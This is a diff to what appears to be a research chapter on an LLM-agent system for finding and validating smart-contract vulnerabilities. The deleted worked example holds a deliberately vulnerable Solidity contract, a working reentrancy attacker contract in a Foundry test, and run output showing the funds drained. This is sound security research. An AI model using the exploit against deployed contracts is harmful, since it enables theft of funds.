@@ -315,6 +315,7 @@ The agent returns a list of potential vulnerabilities. Here's an example output 
     }
   ]
 }
+```
 
 ### 3.3.4 Validation (Skeptic) Agent
 
@@ -614,316 +615,32 @@ The inclusion of this RAG component represents a significant advancement over pu
 
 ## 3.5 Workflow Example
 
-To illustrate the system's operation, let's walk through a complete analysis of a contract with a reentrancy vulnerability. This example demonstrates how the components interact to detect, validate, and exploit the vulnerability.
+To effectively illustrate the system's operation, Figure 3.3 presents a detailed workflow diagram showing how a contract with a reentrancy vulnerability is processed through the system. This visual representation demonstrates the interaction between components, the flow of information, and the transformation of data at each stage of the analysis pipeline.
 
-### 3.5.1 Input Contract
+![Figure 3.3: System Workflow Diagram](workflow_diagram.png)
+*Figure 3.3: Workflow diagram showing the processing of a vulnerable contract through the system pipeline*
 
-Consider a simple contract with a withdraw function vulnerable to reentrancy:
+The diagram illustrates:
 
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+1. **Input Processing**: The system starts with the source code of a smart contract, in this case containing a reentrancy vulnerability in its `withdraw()` function.
 
-contract VulnerableLendingContract {
-    mapping(address => uint256) public balances;
-    
-    function deposit() external payable {
-        balances[msg.sender] += msg.value;
-    }
-    
-    function withdraw(uint256 amount) external {
-        require(balances[msg.sender] >= amount, "Insufficient balance");
-        
-        // Vulnerable: state update after external call
-        (bool success, ) = msg.sender.call{value: amount}("");
-        require(success, "Transfer failed");
-        
-        balances[msg.sender] -= amount;
-    }
-}
-```
+2. **Static Analysis**: Slither analyzes the code, extracting function details and flagging potential vulnerabilities with their impact and confidence levels.
 
-### 3.5.2 Static Analysis Phase
+3. **Retrieval-Augmented Generation**: The system queries its knowledge base for similar vulnerability patterns to enhance the LLM analysis with concrete examples.
 
-The system begins by running Slither on the contract:
+4. **Analyzer Agent**: Using both the static analysis results and retrieved examples, the Analyzer identifies the reentrancy vulnerability, assigns an initial confidence score (0.85), and provides detailed reasoning.
 
-1. Function details are extracted, including the withdraw function with its parameters and visibility
-2. The call graph identifies an external call to msg.sender in the withdraw function
-3. Slither's detectors flag a potential reentrancy issue with the withdraw function
+5. **Skeptic Agent**: This component critically evaluates the findings, validating the vulnerability and adjusting the confidence score (to 0.92) based on its assessment of exploitability.
 
-This information is stored as structured data:
+6. **Exploiter Agent**: For high-confidence vulnerabilities (>0.5), the Exploiter develops a detailed attack plan with setup, execution, and validation steps.
 
-```json
-{
-  "function_details": [
-    {
-      "contract": "VulnerableLendingContract",
-      "function": "withdraw",
-      "visibility": "external",
-      "parameters": [{"uint256": "amount"}],
-      "called_functions": [],
-      "start_line": 11,
-      "end_line": 18,
-      "content": "function withdraw(uint256 amount) external {\n    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n    \n    // Vulnerable: state update after external call\n    (bool success, ) = msg.sender.call{value: amount}(\"\");\n    require(success, \"Transfer failed\");\n    \n    balances[msg.sender] -= amount;\n}"
-    },
-    // Other functions...
-  ],
-  "call_graph": "...",
-  "detector_results": {
-    "reentrancy": [
-      {
-        "description": "Reentrancy in VulnerableLendingContract.withdraw(uint256) (withdraw.sol#11-18):\n\tExternal calls:\n\t- (success) = msg.sender.call{value: amount}() (withdraw.sol#14)\n\tState variables written after the call:\n\t- balances[msg.sender] -= amount (withdraw.sol#17)",
-        "impact": "High",
-        "confidence": "Medium"
-      }
-    ]
-  }
-}
-```
+7. **Generator Agent**: The abstract plan is transformed into concrete, executable code, creating a complete Foundry test contract that demonstrates the vulnerability.
 
-### 3.5.3 Analyzer Agent
+8. **Runner Agent**: The generated exploit is executed in a controlled environment, with results confirming that the attack successfully drained funds from the vulnerable contract.
 
-The Analyzer Agent receives the static analysis data and examines the contract for vulnerabilities:
+9. **Final Report**: The system aggregates all findings into a comprehensive vulnerability report with confidence scores, reasoning, code snippets, and mitigation recommendations.
 
-1. It identifies the reentrancy pattern in the withdraw function
-2. It retrieves similar reentrancy examples from the knowledge base
-3. It generates a detailed analysis of the vulnerability
-
-The agent's output includes:
-
-```json
-{
-  "vulnerabilities": [
-    {
-      "vulnerability_type": "reentrancy",
-      "confidence_score": 0.85,
-      "reasoning": "The withdraw function in VulnerableLendingContract contains a classic reentrancy vulnerability. It performs an external call to msg.sender using call{value: amount}(\"\") before updating the sender's balance with balances[msg.sender] -= amount. This allows an attacker to recursively call withdraw again before their balance is updated, potentially draining all funds from the contract.",
-      "affected_functions": ["withdraw"],
-      "impact": "Critical - could result in complete loss of contract funds",
-      "exploitation_scenario": "An attacker could create a malicious contract that calls deposit() with some ETH, then calls withdraw(). During the withdraw call, the fallback function of the attacker contract would recursively call withdraw() again, allowing multiple withdrawals before the balance is updated."
-    }
-  ]
-}
-```
-
-### 3.5.4 Skeptic Agent
-
-The Skeptic Agent reviews the Analyzer's findings to validate the vulnerability:
-
-1. It examines the code to confirm the reentrancy pattern
-2. It evaluates the practical exploitability of the vulnerability
-3. It assigns a confidence score based on its assessment
-
-The Skeptic's output confirms the vulnerability:
-
-```json
-{
-  "rechecked_vulnerabilities": [
-    {
-      "original_idx": 0,
-      "skeptic_confidence": 0.92,
-      "validity_reasoning": "The vulnerability is confirmed with high confidence. The withdraw function does indeed update the user's balance after making an external call, violating the checks-effects-interactions pattern. This is a textbook reentrancy vulnerability that would allow an attacker to recursively call withdraw before their balance is updated. The contract has no reentrancy guards or other protections against this attack. This vulnerability is directly exploitable with minimal setup and would allow an attacker to drain all ETH from the contract."
-    }
-  ]
-}
-```
-
-### 3.5.5 Exploiter Agent
-
-For this high-confidence vulnerability, the Exploiter Agent develops an attack plan:
-
-```json
-{
-  "plan": {
-    "setup_steps": [
-      "Deploy the vulnerable lending contract",
-      "Create an attacker contract with a fallback function that calls withdraw recursively",
-      "Fund the vulnerable contract with ETH for demonstration",
-      "Deposit some ETH from the attacker contract to establish a balance"
-    ],
-    "execution_steps": [
-      "Call withdraw from the attacker contract for the initial amount deposited",
-      "Within the fallback function of the attacker contract, check remaining balance in the vulnerable contract",
-      "If balance remains, recursively call withdraw again",
-      "Continue until vulnerable contract is drained or gas is exhausted"
-    ],
-    "validation_steps": [
-      "Verify attacker contract has more ETH than initially deposited",
-      "Verify vulnerable contract has less ETH than expected",
-      "Demonstrate that fixing the order of operations (updating state before external call) prevents the attack"
-    ]
-  }
-}
-```
-
-### 3.5.6 Generator Agent
-
-The Generator Agent transforms the exploit plan into executable Foundry test code. Below is the actual generated test contract for the reentrancy vulnerability, which implements the plan from the Exploiter Agent:
-
-```solidity
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.15;
-
-import "./basetest.sol";
-
-// @KeyInfo - Vulnerability: Reentrancy
-// This test demonstrates a reentrancy attack on a vulnerable lending contract
-
-contract ReentrancyTest is BaseTestWithBalanceLog {
-    VulnerableLendingContract public vulnerableLending;
-    AttackerContract public attacker;
-    
-    function setUp() public {
-        // Deploy the vulnerable contract
-        vulnerableLending = new VulnerableLendingContract();
-        
-        // Fund the vulnerable contract
-        vm.deal(address(this), 100 ether);
-        (bool success, ) = address(vulnerableLending).call{value: 10 ether}("");
-        require(success, "Funding failed");
-        
-        // Deploy the attacker contract
-        attacker = new AttackerContract(address(vulnerableLending));
-        vm.deal(address(attacker), 1 ether);
-    }
-    
-    function testExploit() public balanceLog {
-        console.log("Starting reentrancy attack demonstration");
-        
-        // Initial state
-        console.log("Initial vulnerable contract balance:", address(vulnerableLending).balance);
-        console.log("Initial attacker balance:", address(attacker).balance);
-        
-        // Deposit from attacker
-        vm.prank(address(attacker));
-        vulnerableLending.deposit{value: 1 ether}();
-        
-        // Execute attack
-        attacker.attack();
-        
-        // Final state
-        console.log("Final vulnerable contract balance:", address(vulnerableLending).balance);
-        console.log("Final attacker balance:", address(attacker).balance);
-        
-        // Verify the attack was successful
-        assertGt(address(attacker).balance, 1 ether, "Attack did not extract additional funds");
-    }
-}
-
-contract VulnerableLendingContract {
-    mapping(address => uint256) public balances;
-    
-    function deposit() external payable {
-        balances[msg.sender] += msg.value;
-    }
-    
-    function withdraw(uint256 amount) external {
-        require(balances[msg.sender] >= amount, "Insufficient balance");
-        
-        // Vulnerable: state update after external call
-        (bool success, ) = msg.sender.call{value: amount}("");
-        require(success, "Transfer failed");
-        
-        balances[msg.sender] -= amount;
-    }
-}
-
-contract AttackerContract {
-    VulnerableLendingContract public vulnerableLending;
-    uint256 public attackAmount = 1 ether;
-    
-    constructor(address _vulnerableLending) {
-        vulnerableLending = VulnerableLendingContract(_vulnerableLending);
-    }
-    
-    function attack() external {
-        vulnerableLending.withdraw(attackAmount);
-    }
-    
-    // Fallback function that gets triggered when receiving ETH
-    receive() external payable {
-        if (address(vulnerableLending).balance >= attackAmount) {
-            vulnerableLending.withdraw(attackAmount);
-        }
-    }
-}
-```
-
-### 3.5.7 Runner Agent
-
-The Runner Agent executes the generated exploit:
-
-1. It runs the test using Forge: `forge test -vv --match-path exploit/src/test/PoC_reentrancy_1742307322.sol`
-2. It captures the execution output showing the successful exploit
-3. It confirms that the attacker contract successfully extracted more ETH than it deposited
-
-Output snippet:
-```
-Running 1 test for exploit/src/test/PoC_reentrancy_1742307322.sol:ReentrancyTest
-[PASS] testExploit() (gas: 175421)
-Logs:
-  Starting reentrancy attack demonstration
-  Initial vulnerable contract balance: 10000000000000000000
-  Initial attacker balance: 1000000000000000000
-  Final vulnerable contract balance: 0
-  Final attacker balance: 11000000000000000000
-  Attacker ETH Balance Before exploit: 1000000000000000000
-  Attacker ETH Balance After exploit: 11000000000000000000
-
-Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.26s
-```
-
-### 3.5.8 Final Report
-
-The system compiles the results into a comprehensive vulnerability report:
-
-```
-## Vulnerability #1: Reentrancy
-Confidence: 0.92
-
-### Reasoning:
-The withdraw function in VulnerableLendingContract contains a classic reentrancy vulnerability. It performs an external call to msg.sender using call{value: amount}("") before updating the sender's balance with balances[msg.sender] -= amount. This allows an attacker to recursively call withdraw again before their balance is updated, potentially draining all funds from the contract.
-
-### Validation:
-The vulnerability is confirmed with high confidence. The withdraw function does indeed update the user's balance after making an external call, violating the checks-effects-interactions pattern. This is a textbook reentrancy vulnerability that would allow an attacker to recursively call withdraw before their balance is updated. The contract has no reentrancy guards or other protections against this attack.
-
-### Code Snippet:
-```solidity
-function withdraw(uint256 amount) external {
-    require(balances[msg.sender] >= amount, "Insufficient balance");
-    
-    // Vulnerable: state update after external call
-    (bool success, ) = msg.sender.call{value: amount}("");
-    require(success, "Transfer failed");
-    
-    balances[msg.sender] -= amount;
-}
-```
-
-### Proof of Concept:
-✅ SUCCESS
-File: exploit/src/test/PoC_reentrancy_1742307322.sol
-
-The exploit demonstrates that an attacker can drain the entire contract balance by recursively calling withdraw() before their balance is updated.
-
-### Mitigation:
-Implement the checks-effects-interactions pattern by updating the state before making external calls:
-```solidity
-function withdraw(uint256 amount) external {
-    require(balances[msg.sender] >= amount, "Insufficient balance");
-    
-    // Update state before external call
-    balances[msg.sender] -= amount;
-    
-    // External call after state update
-    (bool success, ) = msg.sender.call{value: amount}("");
-    require(success, "Transfer failed");
-}
-```
-Alternatively, use OpenZeppelin's ReentrancyGuard library to add nonReentrant modifiers to vulnerable functions.
-```
-
-This workflow demonstrates the system's ability to not only detect vulnerabilities but also validate them through concrete exploitation and provide actionable mitigation advice.
+This integrated workflow demonstrates how the system combines static analysis tools with multiple specialized LLM agents to provide a comprehensive security analysis that not only identifies vulnerabilities but also validates them through concrete exploitation and offers actionable remediation advice.
 
 ## 3.6 Design Rationale
 
